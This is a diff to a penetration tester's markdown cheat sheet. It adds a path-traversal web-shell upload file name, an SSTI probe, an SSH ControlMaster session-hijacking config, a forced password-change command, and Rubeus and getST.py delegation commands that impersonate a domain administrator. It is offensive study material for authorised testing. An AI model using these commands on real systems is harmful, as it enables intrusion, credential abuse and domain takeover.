@@ -15,8 +15,9 @@
 	- file upload pages to be tested
 	- If there are two or more webservices on the same host (especially if one is like 80 or 8080) and there is a fileupload vector, one should test for path traversal when uploading files. It might be that it is possible to gain file execution only via the port 80 service. 
 		- see if you can influence the upload path either by DIRECTLY CHANGING the NAME of the file (..\..\..\..\..\inetpub\wwwroot\evil.aspx) or burpsuite-ing it
+	- If you are able to get a .db file from the web service, see if it changes when things are uploaded to the webserver
 - DevOps stuff like gitlab, Ansible, Artifactory should be noted down as they will likely play a part further on
-- If there are fields for user input, please try SQL Injection, SSTI payloads. SQLMap can be very useful. For SSTI payloads, run the following:
+- If there are fields for user input, please try SQL Injection, SSTI payloads (Esp if it is powered by ASP.NET Razor). SQLMap can be very useful. For SSTI payloads, run the following:
 ```bash
 # basically if the math resolves, it is vulnerable to code execution
 {{4*4}}
@@ -216,7 +217,8 @@ Get-LAPSComputers
 nxc ldap <DC of domain> -u <User> -H 'hash' --module laps
 ```
 
-#### IT/DEV/HR/(somethingADMINS)
+#### IT/DEV/HR/(somethingADMINS like DEVAdmins/CLAdmins/LinuxAdmins)
+- target those hosts with those hostnames with the creds found
 
 
 #### Bypassing UAC
@@ -267,6 +269,18 @@ export KRB5CCNAME=<path to your krb5cc_owned>
 ```
 
 ### ControlMaster SSH Session Hijacking
+- if you see ControlMaster inside someone's .ssh folder, this might be the path forward
+- first check the config file and make the necessary edits. (if it doesnt exist, create it and chmod 644)
+```bash
+Host *
+        ControlPath ~/.ssh/controlmaster/%r@%h:%p # this dictates the path where new SSH connections will be placed in
+        ControlMaster auto
+        ControlPersist yes # for persistent connections that never drop
+```
+- now we either wait for the target to SSH into our host.
+```bash
+ssh -S ./user\@target\:22 user@target
+```
 
 ## Post-Exploitation (Windows)
 - Remember to tag the owned host on Bloodhound!
@@ -441,10 +455,18 @@ export KRB5CCNAME=<ticket>
 psexec.py administrator@victim09.local.com -k -no-pass
 ```
 
+#### ForceChangePassword
+```bash
+net rpc password "TargetUser" "newpassword" -U "local.com"/"ControlledUser"%"Password" -S "DC FQDN"
+```
+
 #### DelegateTo
 ```bash
 ## do try http, mssql for altservice if it doesnt work! For the SPN, check the spn value of the victim in the bloodhound
+# if the below doesnt work, try removing the domain from the spn
 getST.py -spn 'MSSQLSVC/target.test-ops.com' -impersonate 'administrator' -altservice 'cifs' -hashes ':<hash of controlled machine account>' 'TEST-OPS.COM/CONTROLLEDMACHINE$' -dc-ip 172.16.211.100
+# from windows
+Rubeus.exe s4u /user:APP01$ /rc4:<NTLM hash of APP01$> /impersonateuser:administrator /msdsspn:"CIFS/target" /altservice:cifs /ptt
 ```
 
 #### child/Parent Domain Trust
